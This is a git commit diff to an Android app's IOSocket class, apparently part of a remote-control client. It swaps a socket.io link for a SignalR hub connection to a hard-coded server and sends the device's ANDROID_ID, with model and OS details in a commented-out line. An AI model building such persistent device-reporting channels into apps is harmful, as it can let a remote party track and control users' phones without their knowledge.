cd9a69fb3429f03a6872a21827c797a6dbeafb9f
Paulo Victor <b3t4t3st3@gmail.com>
2021-03-18 22:31:00 -0300

    Initial

--- app/src/main/java/com/remote/app/IOSocket.java
+++ app/src/main/java/com/remote/app/IOSocket.java
@@ -2,27 +2,39 @@ package com.remote.app;
 
 import android.os.Build;
 import android.provider.Settings;
+
+import com.microsoft.signalr.HubConnection;
+import com.microsoft.signalr.HubConnectionBuilder;
+
 import java.net.URISyntaxException;
+import java.util.Dictionary;
+import java.util.HashMap;
+import java.util.Map;
+
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
 public class IOSocket {
-    private static IOSocket ourInstance = new IOSocket();
-    private io.socket.client.Socket ioSocket;
-
+    private static final IOSocket ourInstance = new IOSocket();
+    private HubConnection ioSocket;
 
 
     private IOSocket() {
         try {
-
             String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
-            IO.Options opts = new IO.Options();
-            opts.reconnection = true;
-            opts.reconnectionDelay = 5000;
-            opts.reconnectionDelayMax = 999999999;
 
-            ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
-        } catch (URISyntaxException e) {
+            Map<String, String> headers = new HashMap<String, String>();
+            headers.put("device-id", deviceID);
+            headers.put("user-token", "");
+
+            HubConnection hubConnection = HubConnectionBuilder.create("https://192.168.0.6:5001")
+                    .withHeaders(headers)
+                    .build();
+
+            ioSocket = hubConnection;
+
+            //ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -32,11 +44,9 @@ public class IOSocket {
         return ourInstance;
     }
 
-    public Socket getIoSocket() {
+    public HubConnection getIoSocket() {
         return ioSocket;
     }
-
-
 
 
 }
